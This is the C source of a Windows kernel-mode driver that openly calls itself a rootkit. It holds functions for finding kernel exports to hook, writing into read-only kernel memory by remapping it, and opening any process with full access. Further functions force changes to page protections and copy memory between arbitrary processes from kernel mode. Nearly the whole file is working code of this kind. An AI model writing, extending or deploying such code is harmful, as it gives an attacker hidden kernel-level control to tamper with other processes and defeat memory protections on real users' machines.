#pragma warning(disable: 4267)
#include "memory.h"
#include <ntdef.h>
#include <ntifs.h>
#include <ntddk.h>
#include <windef.h>
#include <ntstrsafe.h>
#include <wdm.h>

/*
Kernel mode functions that are used for the hooking process to a function from an installed module (and more):
*/




PVOID GetSystemModuleBase(const char* module_name) {
	// Get the specific loaded module by name from the system, probably is the actual driver (/.sys file)
	DbgPrintEx(0, 0, "KMDFdriver GET MODULE BASE\n");

	ULONG bytes = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, NULL, bytes, &bytes);

	if (!bytes) {
		DbgPrintEx(0, 0, "KMDFdriver GET MODULE BASE SYSQUERY INVALID SIZE :(\n");
		return NULL;  // Query did not work correctly (size of data returned is not valid)
	}

	// Allocate pool in memory for the driver communication (NonPaged-in memory, size is in bytes, name in hexa-has to be 4 bytes)
	PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, bytes, 0x526B506C);  // tag name is "RkPl"
	status = ZwQuerySystemInformation(SystemModuleInformation, modules, bytes, &bytes);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver GET MODULE BASE POOLALOC DID NOT WORK :(\n");
		return NULL;  // Pool allocation for system modules did not succeed
	}

	PRTL_PROCESS_MODULE_INFORMATION module = modules->Modules;  // Module is a pointer to the actual system modules 
	PVOID module_base = 0, module_size = 0;  // Will save information about the required module

	for (ULONG i = 0; i < modules->NumberOfModules; i++) {
		if (strcmp((char*)module[i].FullPathName, module_name) == 0) {

			// Found the required module in the system modules list
			module_base = module[i].ImageBase;
			module_size = (PVOID)module[i].ImageSize;
			break;
		}
	}

	if (module_base == 0 && module_size == 0) {
		DbgPrintEx(0, 0, "KMDFdriver DID NOT FIND MODULE BASE :(\n");
	}

	if (modules) {
		ExFreePoolWithTag(modules, 0x526B506C);  // Free pool for system modules
	}

	if (module_size <= 0) {
		DbgPrintEx(0, 0, "KMDFdriver INVALID SIZE OF MODULE :(\n");
		return NULL;  // Size specified in system modules list is incorrect
	}

	return module_base;
}




PVOID GetSystemModuleExport(const char* module_name, LPCSTR routine_name) {
	// Find an exported function from the specific system module by name
	DbgPrintEx(0, 0, "KMDFdriver GET FUNCTION FROM MODULE\n");

	PVOID ModuleP = GetSystemModuleBase(module_name);
	if (!ModuleP) {
		DbgPrintEx(0, 0, "KMDFdriver DID NOT FIND MDLBASE FOR FUNCTION :(\n");
		return NULL;  // Couldn't get module base - cannot find a function inside a non existing module
	}
	return RtlFindExportedRoutineByName(ModuleP, routine_name);  // Routine_name = function name from module
}




bool WriteMemory(void* address, void* buffer, size_t size) {
	// Write data from buffer into memory with RtlCopyMemory() (RltCopyMemory() from wdm.h uses memcpy())
	DbgPrintEx(0, 0, "KMDFdriver WRITING TO REGULAR MEMORY\n");

	if (!RtlCopyMemory(address, buffer, size)) {
		DbgPrintEx(0, 0, "KMDFdriver FAILED WRITING TO REGULAR MEMORY :(\n");
		return FALSE;
	}
	return TRUE;
}




bool WriteToReadOnlyMemory(void* address, void* buffer, size_t size) {
	// Write data from buffer into read-only memory by mapping the memory to somewhere else, changing and then unmapping to update og memory
	DbgPrintEx(0, 0, "KMDFdriver WRITING TO READ ONLY MEMORY\n");
	PMDL Mdl = IoAllocateMdl(address, size, FALSE, FALSE, NULL);  // Create descriptor for a range of memory pages

	if (!Mdl) {
		DbgPrintEx(0, 0, "KMDFdriver COULD NOT CREATE MEMORY DESCRIPTOR :(\n");
		return FALSE;  // Descriptor couldn't be created
	}

	MmProbeAndLockPages(Mdl, KernelMode, IoReadAccess);  // Lock the pages in physical memory (similar to NonPaged pool concept)
	
	// Map the memory pages into virtual addresses in the system space to access the locked memory with a pointer
	PVOID Mapping = MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
	
	MmProtectMdlSystemAddress(Mdl, PAGE_READWRITE);  // Set the access type for the locked pages to be read + write

	WriteMemory(Mapping, buffer, size);  // Write into mapped memory
	MmUnmapLockedPages(Mapping, Mdl);  // Unmap mapped memory (update original memory)
	MmUnlockPages(Mdl);  // Unlock pages
	IoFreeMdl(Mdl);  // Free the allocation for the pages descriptor

	return TRUE;
}




/*
Kernel mode functions corresponding to a UM request for a specific hooking function
*/




HANDLE GetProcessHandle(ULONG64 PID, ULONG ProcAtri, ACCESS_MASK ProcAcc) {
	HANDLE DstProc = NULL;
	CLIENT_ID ProcHandle;
	OBJECT_ATTRIBUTES ProcAttr;
	InitializeObjectAttributes(&ProcAttr, NULL, ProcAtri, NULL, NULL);

	ProcHandle.UniqueProcess = (HANDLE)PID;
	ProcHandle.UniqueThread = NULL;

	NTSTATUS status = ZwOpenProcess(&DstProc, ProcAcc, &ProcAttr, &ProcHandle);
	if (!NT_SUCCESS(status)) {
		return NULL;
	}
	return DstProc;
}




VOID CloseCopyHandles(HANDLE Src, HANDLE Dst, BOOL SrcL, BOOL DstL) {
	if (SrcL) {
		ZwClose(Src);
	}
	if (DstL) {
		ZwClose(Dst);
	}
}




RKSYSTEM_INFORET GetModuleBase64bit(PEPROCESS Process, UNICODE_STRING ModuleName) {
	RKSYSTEM_INFORET ModuleBaseRet;
	DbgPrintEx(0, 0, "KMDFdriver MODULE BASE REQUEST\n");
	PPEB PrcPeb = PsGetProcessPeb(Process);
	if (!PrcPeb) {
		DbgPrintEx(0, 0, "KMDFdriver COULD NOT GET PROCESS PEB :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_PRCPEB;
		return ModuleBaseRet;
	}

	KAPC_STATE state;
	KeStackAttachProcess(Process, &state);  // Attach to the process
	PPEB_LDR_DATA PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
	if (!PrcLdr) {
		KeUnstackDetachProcess(&state);  // Deattach from the process
		DbgPrintEx(0, 0, "KMDFdriver NO LOADED MODULES AT ALL (LDR = NULL) :(\n");
		ModuleBaseRet.Buffer = NULL;
		ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_NOLOADEDDLLS;
		return ModuleBaseRet;
	}

	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
		PLDR_DATA_TABLE_ENTRY PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (RtlCompareUnicodeString(&PrcEntry->BaseDllName, &ModuleName, TRUE) == NULL) {
			ULONG64 BaseAddr = (ULONG64)PrcEntry->DllBase;  // Found process module (DLL) by its name in the process modules list
			KeUnstackDetachProcess(&state);  // Deattach from the process
			ModuleBaseRet.Buffer = (PVOID)1;
			ModuleBaseRet.BufferSize = BaseAddr;
			return ModuleBaseRet;
		}
	}
	KeUnstackDetachProcess(&state);  // Deattach from the process, did not work
	DbgPrintEx(0, 0, "KMDFdriver FAILED TO GET MODULE BASE :(\n");
	ModuleBaseRet.Buffer = NULL;
	ModuleBaseRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	return ModuleBaseRet;
}




ROOTKIT_STATUS CopyBetweenProcs(HANDLE DstProc, HANDLE SrcProc, PVOID Address, PVOID Buffer, ULONG64 Size, ULONG64 SrcPID, ULONG64 DstPID) {
	DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST\n");
	PVOID Info = NULL;
	PMEMORY_BASIC_INFORMATION info;
	ULONG64 ActCpd = 0;
	ULONG64 KrnlPID = 0xFFFFFFFFFFFFFFFF;
	NTSTATUS status;
	BOOL IsSrcLocal = FALSE;
	BOOL IsDstLocal = FALSE;

	// Validate the parameters given -
	if (!Address || !Buffer || !Size) {
		DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST INVALID ADDRESS/BUFFER/SIZE :(\n");
		return ROOTKSTATUS_ADRBUFSIZE;
	}

	// Get process handles -
	if (SrcProc == NULL && SrcPID != KrnlPID) {
		IsSrcLocal = TRUE;
		SrcProc = GetProcessHandle(SrcPID, OBJ_KERNEL_HANDLE, PROCESS_ALL_ACCESS);
		if (SrcProc == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST COULD NOT GET SOURCE PROCESS HANDLE :(\n");
			return ROOTKSTATUS_PROCHANDLE;
		}
	}

	if (DstProc == NULL && DstPID != KrnlPID) {
		IsDstLocal = TRUE;
		DstProc = GetProcessHandle(DstPID, OBJ_KERNEL_HANDLE, PROCESS_ALL_ACCESS);
		if (DstProc == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST COULD NOT GET DESTINATION PROCESS HANDLE :(\n");
			if (IsSrcLocal) {
				ZwClose(SrcProc);
			}
			return ROOTKSTATUS_PROCHANDLE;
		}
	}


	// Get EPROCESS structure of each process for copying function -
	PEPROCESS SrcProcess;
	PEPROCESS DstProcess;
	if (SrcPID == KrnlPID) {
		SrcProc = ZwCurrentProcess();
	}
	PsLookupProcessByProcessId(SrcProc, &SrcProcess);

	if (DstPID == KrnlPID) {
		DstProc = ZwCurrentProcess();
	}

	PsLookupProcessByProcessId(DstProc, &DstProcess);


	/*
	==================================================================================
	SOURCE PROCESS VALIDATION (PROTECTION SETTINGS AND MANIPULATION OF THEM IF NEEDED)
	==================================================================================
	*/


	if (SrcPID != KrnlPID) {
		// Allocate memory for source query of memory -
		Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
		if (!Info) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY (SOURCE) :(\n");
			CloseCopyHandles(SrcProc, DstProc, IsSrcLocal, IsDstLocal);
			return ROOTKSTATUS_MEMALLOC;
		}


		// Query -
		status = ZwQueryVirtualMemory(SrcProc, Buffer, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST FAILED VIRTMEM QUERY FOR SOURCE PROCESS :(\n");
			CloseCopyHandles(SrcProc, DstProc, IsSrcLocal, IsDstLocal);
			ExFreePool(Info);
			return ROOTKSTATUS_QUERYVIRTMEM;
		}
		info = (PMEMORY_BASIC_INFORMATION)Info;

		// Verify the protection settings are valid for reading -
		if (!((info->Protect & PAGE_EXECUTE_READWRITE) || (info->Protect & PAGE_EXECUTE_READ) || (info->Protect & PAGE_READONLY) || (info->Protect & PAGE_READWRITE))
			|| info->Protect & (PAGE_GUARD | PAGE_NOACCESS)) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST - NO READ PROTETION SETTINGS FOR SOURCE PROCESS, TRYING TO CHANGE..\n");
			BOOL ReadProtSuccess = ChangeProtectionSettings(SrcProc, Buffer, (ULONG)Size, PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_READ | PAGE_READONLY | PAGE_READWRITE, PAGE_GUARD | PAGE_NOACCESS);
			if (!ReadProtSuccess) {
				DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST FAILED BECAUSE OF SOURCE PROTECTION SETTINGS (COULD NOT GET READ ACCESS) :(\n");
				CloseCopyHandles(SrcProc, DstProc, IsSrcLocal, IsDstLocal);
				ExFreePool(Info);
				return ROOTKSTATUS_PROTECTIONSTG;
			}
		}
		ExFreePool(Info);
		Info = NULL;
	}


	/*
	=======================================================================================
	DESTINATION PROCESS VALIDATION (PROTECTION SETTINGS AND MANIPULATION OF THEM IF NEEDED)
	=======================================================================================
	*/


	if (DstPID != KrnlPID) {

		// Make sure the memory range in the process is committed and with the right protection settings -
		BOOL CommitSuccess = ForceCommitMemRegions(DstProc, Address, Size, MEM_COMMIT, PAGE_READWRITE | PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY);
		if (!CommitSuccess) {
			DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST FAILED - ADDRESS RANGE CANNOT BE COMMITTED TO MEMORY IN DESTINATION PROCESS :(\n");
			CloseCopyHandles(SrcProc, DstProc, IsSrcLocal, IsDstLocal);
			return ROOTKSTATUS_NOTCOMMITTED;
		}
		DbgPrintEx(0, 0, "KMDFdriver COPY MEMORY BETWEEN PROCESSES REQUEST COMMIT SUCCEEDED\n");
	}


	/*
	=====================================================================================
	COPY ACTUAL MEMORY FROM SOURCE PROCESS INTO DESTINATION PROCESS (VIRTUAL MEMORY COPY)
	=====================================================================================
	*/
	status = MmCopyVirtualMemory(SrcProcess, Buffer, DstProcess, Address, Size, KernelMode, &ActCpd);
	CloseCopyHandles(SrcProc, DstProc, IsSrcLocal, IsDstLocal);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver FAILED COPYING DATA FROM SOURCE PROCESS TO DESTINATION PROCESS, TRYING SOMETHING ELSE..\n");
		if (DstPID ==  SrcPID && DstPID != KrnlPID) {
			if (!WriteMemory(Address, Buffer, (SIZE_T)Size)) {
				DbgPrintEx(0, 0, "KMDFdriver FAILED WRITING DATA BETWEEN ADDRESSES WITH RTLCOPYMEMORY REGULAR..\n");
			}
			else {
				return ROOTKSTATUS_SUCCESS;
			}

			if (!WriteToReadOnlyMemory(Address, Buffer, (SIZE_T)Size)) {
				DbgPrintEx(0, 0, "KMDFdriver FAILED WRITING DATA BETWEEN ADDRESSES WITH RTLCOPYMEMORY READ-ONLY..\n");
				return ROOTKSTATUS_COPYFAIL;
			}
			else {
				return ROOTKSTATUS_SUCCESS;
			}
		}
		return ROOTKSTATUS_COPYFAIL;
	}
	else {
		// Make a special log if less info was received than expected -
		if (ActCpd < Size) {
			DbgPrintEx(0, 0, "KMDFdriver REQUESTED AMOUNT TO READ < ACTUAL AMOUNT THAT WAS READ :|\n");
			return ROOTKSTATUS_LESSTHNREQ;
		}
		return ROOTKSTATUS_SUCCESS;
	}
}




void PrintMsgFromKrnl(const char* Message)
{
	DbgPrintEx(0, 0, "KMDFdriver PRINT MESSAGE REQUEST\n");
	DbgPrintEx(0, 0, "KMDFdriver Message: %s\n", Message);
}




ROOTKIT_STATUS RetSystemInformation(ULONG64 PID, PVOID DstBuffer, PVOID SrcBuffer, ULONG BufferSize, DWORD RequestNum) {
	ROOTKIT_STATUS WriteStatus;
	DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION REQUEST NUMBER %u\n", RequestNum);

	HANDLE DstProc = GetProcessHandle(PID, OBJ_KERNEL_HANDLE, PROCESS_ALL_ACCESS);

	if (DstProc == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver RETURN SYSTEM INFORMATION CANNOT GET HANDLE OF DESTINATION PROCESS :(\n");
		ExFreePool(SrcBuffer);
		return ROOTKSTATUS_PROCHANDLE;
	}

	WriteStatus = CopyBetweenProcs(DstProc, NULL, DstBuffer, SrcBuffer, BufferSize, 0xFFFFFFFFFFFFFFFF, 0);
	ZwClose(DstProc);
	ExFreePool(SrcBuffer);
	return WriteStatus;
}




RKSYSTEM_INFORET RequestSystemInfo(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	NTSTATUS status;
	PVOID Buffer = NULL;
	ULONG BufferSizeInc = 1024;
	ULONG InitBufferSize = 1024;
	ULONG BufferSize;
	RKSYSTEM_INFORET SysInfoRet;
	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST NUMBER %u\n", SysInfNum);
	DbgPrintEx(0, 0, "KMDFdriver RequestSysteminfo REQUESTED INFO TYPE - %u\n", InfoType);

	while (InitBufferSize <= 0xFFFFFFFF) {
		DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST TRYING WITH BUFFER SIZE OF %u..\n", InitBufferSize);

		// Allocate an inital buffer -
		Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, InitBufferSize, (ULONG)Flag);
		if (!Buffer) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
			return SysInfoRet;
		}

		// Query the required buffer size -
		status = ZwQuerySystemInformation(InfoType, Buffer, InitBufferSize, &BufferSize);
		if (NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED FIRST TRY (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);
			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

		else if (status == STATUS_INFO_LENGTH_MISMATCH || status == 0xC0000004 || status == -1073741820) {
			// Allocate memory -
			status = 0;
			ExFreePool(Buffer);
			Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, (ULONG)Flag);
			if (!Buffer) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY :(\n");
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}

			// Query system information -
			status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, NULL);
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED SYSTEM INFO QUERY :(\n");
				ExFreePool(Buffer);
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_QUERYVIRTMEM;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED AFTER STATUS_INFO_LENGTH_MISMATCH (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);

			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

		else if (status == STATUS_ACCESS_VIOLATION || status == 0xC0000005 || status == -1073741819) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST MEMORY ACCESS VIOLATION (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_ACSVIO;
			ExFreePool(Buffer);
			return SysInfoRet;
		}

		else if (status == STATUS_NOT_SUPPORTED || status == 0xC00000BB || status == -1073741637) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST STATUS NOT SUPPORTED (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_NOTSUPPORTED;
			ExFreePool(Buffer);
			return SysInfoRet;
		}
		else {
			ExFreePool(Buffer);
			Buffer = NULL;
			InitBufferSize += BufferSizeInc;
		}
	}
	
	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED ALLOCATING A VALID BUFFER FOR INFO (SIZE>0XFFFF / DIFFERENT ERRORS FOR QUERY EVERY TRY) :(\n");
	SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	SysInfoRet.Buffer = NULL;
	return SysInfoRet;
}




RKSYSTEM_INFORET GetSystemInfoRetLen(SYSTEM_INFORMATION_CLASS InfoType, ULONG64 Flag, DWORD SysInfNum) {
	RKSYSTEM_INFORET SysInfRet;
	SysInfRet = RequestSystemInfo(InfoType, Flag, SysInfNum);
	return SysInfRet;
}




BOOL ForceCommitMemRegions(HANDLE PID, PVOID Address, SIZE_T Size, ULONG AllocState, ULONG AllocProt) {
	/*
	Forcefully commits a range of pages in processes memory (Address + Size, filled to sides)
	ASSUMES: KeAttach was used successfully before the function and is still available
	*/


	// Check if ok with query -
	PMEMORY_BASIC_INFORMATION info;
	NTSTATUS status;
	PVOID Info = NULL;
	BOOL ProtRes;

	Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY (INITIAL) :(\n");
		return FALSE;
	}

	// Initial query -
	status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST FAILED VIRTMEM QUERY (INITIAL) :(\n");
		ExFreePool(Info);
		return FALSE;
	}

	info = (PMEMORY_BASIC_INFORMATION)Info;
	if (info->State & AllocState) {
		// memory is already committed/else AND allocated
		if (info->Protect & AllocProt) {
			ExFreePool(Info);
			return TRUE;
		}
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST INVALID EXISTING SETTINGS, TRYING TO CHANGE (INITIAL)..\n");
		ProtRes = ChangeProtectionSettings(PID, Address, (ULONG)Size, AllocProt, PAGE_GUARD | PAGE_NOACCESS);
		ExFreePool(Info);
		return ProtRes;
	}
	ExFreePool(Info);

	// Allocate the range of pages in processes virtual memory with the required allocation type and protection settings -
	status = ZwAllocateVirtualMemory(PID, &Address, NULL, &Size, AllocState, AllocProt);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}


	// Validate committing success with query -
	Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY :(\n");
		return FALSE;
	}

	// Query -
	status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST FAILED VIRTMEM QUERY :(\n");
		ExFreePool(Info);
		return FALSE;
		}
	info = (PMEMORY_BASIC_INFORMATION)Info;

	if (!(info->State & AllocState)) {
		ExFreePool(Info);
		return FALSE;
	}

	// Could commit and allocate the memory
	if (info->Protect & AllocProt) {
		ExFreePool(Info);
		return TRUE;
	}

	DbgPrintEx(0, 0, "KMDFdriver ForceCommitMemRegions REQUEST INVALID EXISTING SETTINGS, TRYING TO CHANGE ..\n");
	ProtRes = ChangeProtectionSettings(PID, Address, (ULONG)Size, AllocProt, PAGE_GUARD | PAGE_NOACCESS);
	ExFreePool(Info);
	return ProtRes;
}




BOOL ChangeProtectionSettings(HANDLE PID, PVOID Address, ULONG Size, ULONG ProtSettings, ULONG ExcludeProtStgs) {
	/*
	Change protection setttings of a range of pages (Address + Size, filled to sides)
	ASSUMES: KeAttach was used successfully before the function and is still available
	*/


	// Get the first page's protection setting to manipulate all of them -
	PMEMORY_BASIC_INFORMATION FirstInfo;
	PVOID Info = NULL;
	NTSTATUS status;

	// Allocate memory for destination query of memory -
	Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY :(\n");
		return FALSE;
	}

	// Query -
	status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST FAILED VIRTMEM QUERY :(\n");
		ExFreePool(Info);
		return FALSE;
	}
	FirstInfo = (PMEMORY_BASIC_INFORMATION)Info;

	// Change the protection settings of the whole memory range -
	NTSTATUS success = ZwProtectVirtualMemory(PID, &Address, &Size, ProtSettings, &FirstInfo->Protect);
	if (!NT_SUCCESS(success)) {
		ExFreePool(Info);
		return FALSE;
	}
	ExFreePool(Info);


	// Allocate memory for destination query of memory -
	Info = ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MEMORY_BASIC_INFORMATION), 0x7EE78BB8);
	if (!Info) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST COULD NOT ALLOCATE MEMORY FOR MEMORY QUERY (SECOND) :(\n");
		return FALSE;
	}

	// Query -
	status = ZwQueryVirtualMemory(PID, Address, MemoryBasicInformation, Info, sizeof(MEMORY_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver ChangeProtectionSettings REQUEST FAILED VIRTMEM QUERY (SECOND) :(\n");
		ExFreePool(Info);
		return FALSE;
	}
	FirstInfo = (PMEMORY_BASIC_INFORMATION)Info;

	if ((FirstInfo->Protect & ProtSettings) && ! (FirstInfo->Protect & ExcludeProtStgs)) {
		ExFreePool(Info);
		return TRUE;
	}
	ExFreePool(Info);
	return FALSE;
}